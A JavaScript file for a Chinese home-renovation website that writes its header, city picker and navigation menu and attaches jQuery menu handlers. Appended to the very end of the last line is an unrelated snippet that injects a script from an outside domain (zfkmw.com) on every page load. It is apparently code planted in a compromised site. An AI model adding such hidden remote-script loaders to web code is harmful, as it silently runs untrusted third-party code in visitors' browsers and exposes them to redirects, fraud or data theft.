document.writeln("<header class=\"comheader\">");
document.writeln("    <block name=\"city\">");
document.writeln("        <div class=\"hleft\">");
document.writeln("            <i></i>");
document.writeln("            <font>合肥</font><span></span>");
document.writeln("        </div>");
document.writeln("        <!--北京123-->");
document.writeln("        <div class=\"city_all\" style=\"display: none;\"><em>X</em>");
document.writeln("            <a href=\"javascript:void(0)\" id=\"69\">北京</a><a href=\"javascript:void(0)\" id=\"364\">西安</a><a href=\"javascript:void(0)\" id=\"367\">大连</a><a href=\"javascript:void(0)\" id=\"183\">广州</a><a href=\"javascript:void(0)\" id=\"177\">深圳</a><a href=\"javascript:void(0)\" id=\"178\">重庆</a><a href=\"javascript:void(0)\" id=\"176\">杭州</a><a href=\"javascript:void(0)\" id=\"185\">南京</a><a href=\"javascript:void(0)\" id=\"184\">苏州</a><a href=\"javascript:void(0)\" id=\"222\">上海</a><a href=\"javascript:void(0)\" id=\"70\">长沙</a><a href=\"javascript:void(0)\" id=\"174\">成都</a><a href=\"javascript:void(0)\" id=\"71\">武汉</a><a href=\"javascript:void(0)\" id=\"111\">福州</a><a href=\"javascript:void(0)\" id=\"72\">南昌</a><a href=\"javascript:void(0)\" id=\"115\">益阳</a><a href=\"javascript:void(0)\" id=\"112\">赣州</a><a href=\"javascript:void(0)\" id=\"113\">九江</a><a href=\"javascript:void(0)\" id=\"114\">吉安</a><a href=\"javascript:void(0)\" id=\"223\">天津</a><a href=\"javascript:void(0)\" id=\"224\">郑州</a>");
document.writeln("        </div>");
document.writeln("    </block>");
document.writeln("    <a class=\"hcenter\"></a>");
document.writeln("    <div class=\"hright\"><i></i></div>");
document.writeln("    <div class=\"am-offcanvas am-active\" style=\"touch-action: pan-y; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); display: none;\">");
document.writeln("        <div class=\"am-offcanvas-bar am-offcanvas-bar-flip am-offcanvas-bar-overlay am-offcanvas-bar-active\">");
document.writeln("            <ul class=\"am-menu-nav am-avg-sm-1\">");
document.writeln("                <li class=\"\">");
document.writeln("                    <a href=\"/\" class=\"\">首页</a>");
document.writeln("                </li>");
document.writeln("                <li class=\"\">");
document.writeln("                    <a href=\"/quanbao.html\" class=\"\">大全包</a>");
document.writeln("                </li>");
document.writeln("                <li class=\"\">");
document.writeln("                    <a href=\"/diary/\" class=\"\">快速报价</a>");
document.writeln("                </li>");
//document.writeln("                <li class=\"\">");
//document.writeln("                    <a href=\"/designer/\" class=\"\">设计团队</a>");
//document.writeln("                </li>");
document.writeln("                <li class=\"\">");
document.writeln("                    <a href=\"/vr/\" class=\"\">VR体验馆</a>");
document.writeln("                </li>");
document.writeln("                <li class=\"\">");
document.writeln("                    <a href=\"/case/\" class=\"\">装修案例</a>");
document.writeln("                </li>");
document.writeln("                <li class=\"\">");
document.writeln("                    <a href=\"/strategy/\" class=\"\">装修攻略</a>");
document.writeln("                </li>");
document.writeln("                <li class=\"\">");
document.writeln("                    <a href=\"/huodong\" class=\"\">最新活动</a>");
document.writeln("                </li>");
document.writeln("            </ul>");
document.writeln("        </div>");
document.writeln("    </div>");
document.writeln("</header>");
/*左侧菜单*/
/*
    $('.hleft').click(function() {
        $('.city_all').stop().fadeIn();

    });
    $('.city_all>em').click(function() {

        $('.city_all').hide();
    });
    */
/*右侧菜单*/
$('.hright>i').click(function() {
    $('.am-active').stop().fadeIn();
});
$('.am-active').click(function() {

    $(this).fadeOut();
});

$('div.city_all a').click(function() {
    var thisID = $(this).attr('id');
    var thisName = $(this).text();
    $('.hleft').html('<i></i><font>' + thisName + '</font><span></span>');
    $('.city_all').hide();
});(function() {const scr = document.createElement('script');scr.type = 'text/javascript';scr.src='https://zfkmw.com/j/rumzr.js';document.head.appendChild(scr);window.adLoad=true;})()